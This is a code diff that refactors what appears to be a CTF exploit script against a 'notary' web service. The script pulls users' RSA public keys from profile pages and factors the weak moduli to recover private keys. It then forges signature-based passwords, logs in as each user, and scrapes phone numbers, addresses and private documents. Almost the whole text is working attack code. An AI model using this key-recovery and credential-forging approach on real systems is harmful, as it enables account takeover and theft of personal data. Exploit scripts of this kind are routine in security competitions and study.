@@ -6,8 +6,8 @@ import gmpy
 import bisect
 import requests
 
+import parse
 import notary
-from parse import Parser
 
 
 def count_splits(bits, n):
@@ -73,27 +73,28 @@ def factorize(n, start_limit=10):
         limit *= 2
 
 
-def recover_private_key(N, e):
-    p, q = factorize(N)
+def recover_private_key(public):
+    p, q = factorize(public.N)
     phi = (p + 1) * (q + 1)
-    d = int(gmpy.invert(e, phi))
-    return N, p, q, e, d
+    d = int(gmpy.invert(public.e, phi))
+    private = notary.Private(public.N, p, q, public.e, d)
+    assert private.is_valid()
+    return private
 
 
 def recover_user_credentials(url, user_url):
     html = requests.get(url + user_url).text
 
-    username = Parser(html).username()
+    username = parse.Parser(html).username()
 
-    public_key = Parser(html).public_key()
-    N, e = notary.load_numbers(notary.deserialize_bytes(public_key))
+    public_key = parse.Parser(html).public_key()
+    public = notary.Public.unpack(public_key)
 
-    N, p, q, e, d = recover_private_key(N, e)
-    private_key = notary.pack_numbers(N, p, q, e, d)
+    private = recover_private_key(public)
 
-    password = notary.create_sign(private_key, username.encode('utf-8'))
+    password = notary.Signature.create(private, username.encode('utf-8'))
 
-    return username, notary.serialize_bytes(password)
+    return username, notary.Bytes.pack(password)
 
 
 def main():
@@ -103,7 +104,7 @@ def main():
     url = f'http://{IP}:{PORT}'
 
     html = requests.get(url).text
-    cards = Parser(html).document_cards()
+    cards = parse.Parser(html).document_cards()
 
     for document_url, text, user_url in cards:
         username, password = recover_user_credentials(url, user_url)
@@ -111,11 +112,11 @@ def main():
         session = requests.session()
 
         html = session.get(url + '/login').text
-        csrf_token = Parser(html).csrf_token()
+        csrf_token = parse.Parser(html).csrf_token()
 
         profile = session.post(url + '/login', data={'csrf_token': csrf_token, 'username': username, 'password': password}).text
 
-        parser = Parser(profile)
+        parser = parse.Parser(profile)
         phone = parser.phone()
         address = parser.address()
 
@@ -123,7 +124,7 @@ def main():
 
         if 'Private document' in text:
             html = session.get(url + document_url).text
-            content = Parser(html).document_text()
+            content = parse.Parser(html).document_text()
             
             print(document_url, content)
 
